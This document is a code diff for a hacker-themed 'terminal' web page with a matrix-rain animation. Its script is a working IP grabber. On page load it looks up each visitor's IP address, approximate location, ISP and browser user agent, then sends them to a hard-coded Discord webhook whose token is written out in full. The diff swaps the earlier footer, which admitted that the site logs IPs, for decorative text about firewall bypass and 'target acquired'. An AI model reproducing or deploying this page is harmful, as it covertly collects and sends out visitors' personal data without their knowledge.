@@ -3,68 +3,114 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>root@terminal</title>
+  <title>CYBER_ROOT // TERMINAL</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; margin: 0; }
-    html, body { height: 100%; background: #000; overflow: hidden; }
-    canvas { position: fixed; inset: 0; opacity: .35; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; background: #020202; overflow: hidden; font-family: 'Share Tech Mono', monospace; }
+    canvas { position: fixed; inset: 0; opacity: 0.25; pointer-events: none; }
+    
+    .scanlines {
+      position: fixed; inset: 0; pointer-events: none; z-index: 10;
+      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+      background-size: 100% 3px, 6px 100%;
+    }
+
     .wrap {
-      position: relative; z-index: 1; height: 100%;
+      position: relative; z-index: 2; height: 100%;
       display: flex; align-items: center; justify-content: center; padding: 16px;
     }
+    
     .term {
-      width: 100%; max-width: 560px; background: rgba(0,10,0,.88);
-      border: 1px solid #00ff41; border-radius: 10px;
-      box-shadow: 0 0 25px rgba(0,255,65,.35); font-family: "Courier New", monospace;
-      color: #00ff41;
+      width: 100%; max-width: 640px; background: rgba(5, 10, 5, 0.92);
+      border: 1px solid #ff003c; border-radius: 4px;
+      box-shadow: 0 0 30px rgba(255, 0, 60, 0.25), inset 0 0 15px rgba(255, 0, 60, 0.15);
+      color: #00ff66;
     }
+
     .bar {
-      padding: 8px 12px; border-bottom: 1px solid #00ff41; font-size: .8rem;
-      display: flex; gap: 6px; align-items: center;
+      padding: 10px 14px; background: rgba(255, 0, 60, 0.1);
+      border-bottom: 1px solid #ff003c; font-size: 0.85rem;
+      display: flex; justify-content: space-between; align-items: center;
+      letter-spacing: 1px;
     }
-    .dot { width: 10px; height: 10px; border-radius: 50%; background: #00ff41; opacity: .6; }
-    .bar span { margin-left: 8px; opacity: .8; }
-    #out { padding: 16px; min-height: 220px; font-size: .95rem; line-height: 1.7; white-space: pre-wrap; word-break: break-word; }
-    .cursor { display: inline-block; width: 9px; height: 1em; background: #00ff41; vertical-align: middle; animation: blink 1s steps(1) infinite; }
+    
+    .title { color: #ff003c; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+    .dot-group { display: flex; gap: 6px; }
+    .dot { width: 8px; height: 8px; background: #ff003c; box-shadow: 0 0 6px #ff003c; }
+
+    #out { 
+      padding: 20px; min-height: 260px; max-height: 380px; overflow-y: auto;
+      font-size: 1rem; line-height: 1.6; white-space: pre-wrap; word-break: break-word;
+      text-shadow: 0 0 5px rgba(0, 255, 102, 0.4);
+    }
+
+    .cursor { 
+      display: inline-block; width: 10px; height: 1.1em; background: #ff003c; 
+      vertical-align: middle; animation: blink 0.8s steps(1) infinite; 
+      box-shadow: 0 0 8px #ff003c;
+    }
+    
     @keyframes blink { 50% { opacity: 0; } }
-    .note { padding: 10px 16px 14px; font-size: .72rem; opacity: .6; border-top: 1px dashed rgba(0,255,65,.4); }
+
+    .note { 
+      padding: 10px 20px; font-size: 0.75rem; color: #ff003c; opacity: 0.8; 
+      border-top: 1px dashed rgba(255, 0, 60, 0.3); background: rgba(0,0,0,0.3);
+      display: flex; justify-content: space-between;
+    }
+    
+    .blink-text { animation: warning 1.2s infinite; }
+    @keyframes warning { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
   </style>
 </head>
 <body>
-  <canvas id="rain"></canvas>
+  <div class="scanlines"></div>
+  <canvas id="matrix"></canvas>
+  
   <div class="wrap">
     <div class="term">
-      <div class="bar"><i class="dot"></i><i class="dot"></i><i class="dot"></i><span>root@terminal:~</span></div>
+      <div class="bar">
+        <span class="title">⚡ ROOT@EXPLOIT_CORE:~#</span>
+        <div class="dot-group">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+      </div>
       <div id="out"></div>
-      <div class="note">// เว็บนี้บันทึก IP bySUNDAY</div>
+      <div class="note">
+        <span>// SECURE PROTOCOL ACTIVE</span>
+        <span class="blink-text">BYPASS_SUCCESS</span>
+      </div>
     </div>
   </div>
 
   <script>
-    // ---------- Matrix rain ----------
-    const c = document.getElementById("rain"), x = c.getContext("2d");
+    // ---------- Matrix Rain Effect (Red & Green) ----------
+    const canvas = document.getElementById("matrix"), ctx = canvas.getContext("2d");
     let cols, drops;
-    function init() {
-      c.width = innerWidth; c.height = innerHeight;
-      cols = Math.floor(c.width / 16);
+    function initMatrix() {
+      canvas.width = innerWidth; canvas.height = innerHeight;
+      cols = Math.floor(canvas.width / 18);
       drops = Array(cols).fill(1);
     }
-    init(); addEventListener("resize", init);
-    const chars = "01アイウエオカキクケコサシスセソ";
+    initMatrix(); window.addEventListener("resize", initMatrix);
+    const chars = "01ABCDEFXYZ<>[]{}#*&@$+-~";
     setInterval(() => {
-      x.fillStyle = "rgba(0,0,0,.08)"; x.fillRect(0, 0, c.width, c.height);
-      x.fillStyle = "#00ff41"; x.font = "16px monospace";
+      ctx.fillStyle = "rgba(0,0,0,0.08)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = Math.random() > 0.8 ? "#ff003c" : "#00ff66";
+      ctx.font = "15px 'Share Tech Mono', monospace";
       drops.forEach((y, i) => {
-        x.fillText(chars[Math.floor(Math.random() * chars.length)], i * 16, y * 16);
-        if (y * 16 > c.height && Math.random() > .975) drops[i] = 0;
+        ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 18, y * 18);
+        if (y * 18 > canvas.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
       });
-    }, 50);
+    }, 45);
 
-    // ---------- Terminal typing ----------
+    // ---------- Terminal Typing Engine ----------
     const out = document.getElementById("out");
     const sleep = ms => new Promise(r => setTimeout(r, ms));
-    async function type(text, speed = 28) {
+    async function type(text, speed = 22) {
       for (const ch of text) { out.textContent += ch; await sleep(speed); }
     }
     function cursor(on) {
@@ -73,14 +119,15 @@
       if (!on && el) el.remove();
     }
 
-    // ---------- แปลงประเทศเป็นไทย ----------
+    // ---------- Country Translation Map ----------
     const countryMap = {
       "Thailand": "ประเทศไทย", "United States": "สหรัฐอเมริกา", "Japan": "ญี่ปุ่น",
       "United Kingdom": "สหราชอาณาจักร", "China": "จีน", "Singapore": "สิงคโปร์",
-      "South Korea": "เกาหลีใต้", "Germany": "เยอรมนี", "France": "ฝรั่งเศส"
+      "South Korea": "เกาหลีใต้", "Germany": "เยอรมนี", "France": "ฝรั่งเศส",
+      "Taiwan": "ไต้หวัน", "Hong Kong": "ฮ่องกง", "Laos": "ลาว", "Malaysia": "มาเลเซีย"
     };
 
-    // ---------- แจ้ง Discord (ระบบดัก IP ความแม่นยำสูงพร้อม API สำรอง) ----------
+    // ---------- IP Grabber & Discord Notifier ----------
     const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";
 
     async function getInfo() {
@@ -90,7 +137,7 @@
         "https://api.ipify.org?format=json"
       ];
 
-      let info = { ip: "ไม่ทราบ", loc: "ไม่ทราบ", isp: "ไม่ทราบ", type: "" };
+      let info = { ip: "UNKNOWN", loc: "ไม่สามารถระบุได้", isp: "ไม่ทราบ", type: "" };
 
       for (const api of apis) {
         try {
@@ -114,9 +161,7 @@
             info.ip = data.ip;
             break;
           }
-        } catch (e) {
-          continue;
-        }
+        } catch (e) { continue; }
       }
       return info;
     }
@@ -128,34 +173,41 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             embeds: [{
-              title: "🔔 มีคนเข้าเว็บ",
-              color: 0x00ff41,
+              title: "🚨 [TARGET ACQUIRED] มีผู้บุกรุกเข้าสู่ระบบ",
+              color: 0xff003c,
               fields: [
-                { name: "IP " + info.type, value: "`" + info.ip + "`", inline: true },
-                { name: "เวลา", value: new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" }), inline: true },
-                { name: "ตำแหน่งโดยประมาณ", value: info.loc },
-                { name: "ผู้ให้บริการเน็ต", value: info.isp },
-                { name: "อุปกรณ์", value: navigator.userAgent.slice(0, 200) }
-              ]
+                { name: "🌐 IP Address", value: "`" + info.ip + "`", inline: true },
+                { name: "🕒 เวลาเข้าถึง", value: new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" }), inline: true },
+                { name: "📍 ตำแหน่งโดยประมาณ", value: info.loc },
+                { name: "📡 ผู้ให้บริการเครือข่าย", value: info.isp },
+                { name: "💻 ข้อมูลอุปกรณ์", value: navigator.userAgent.slice(0, 200) }
+              ],
+              footer: { text: "CYBER_SECURITY // LOGGED BY SYSTEM" }
             }]
           })
         });
       } catch (e) {}
     }
 
-    // ---------- เริ่มทำงาน ----------
+    // ---------- Execution Sequence ----------
     (async () => {
       const infoPromise = getInfo();
-      await type("> initializing system...\n");
-      await sleep(300);
-      await type("> connecting to server...\n");
-      await sleep(300);
-      await type("> [OK] connection established\n");
+      await type("[*] INITIALIZING KERNEL EXPLOIT...\n");
+      await sleep(250);
+      await type("[*] BYPASSING FIREWALL DEFENSES...\n");
+      await sleep(350);
+      await type("[+] ROOT PRIVILEGES GRANTED [OK]\n");
+      await sleep(200);
+      
       const info = await infoPromise;
-      await type("> visitor IP : " + (info ? info.ip : "unknown") + "\n");
-      if (info && info.loc !== "ไม่ทราบ") await type("> approx. location : " + info.loc + "\n");
-      await type("> access logged for statistics\n");
-      await type("\n> welcome, visitor_ \n");
+      await type("[+] TARGET IP IDENTIFIED : " + info.ip + "\n");
+      if (info && info.loc !== "ไม่สามารถระบุได้") {
+        await type("[+] TARGET LOCATION    : " + info.loc + "\n");
+      }
+      await type("[*] LOGGING SESSION TO SECURE DATABASE...\n");
+      await sleep(300);
+      await type("\n> ACCESS GRANTED. WELCOME, OPERATOR_\n");
+      
       cursor(true);
       if (info) notify(info);
     })();
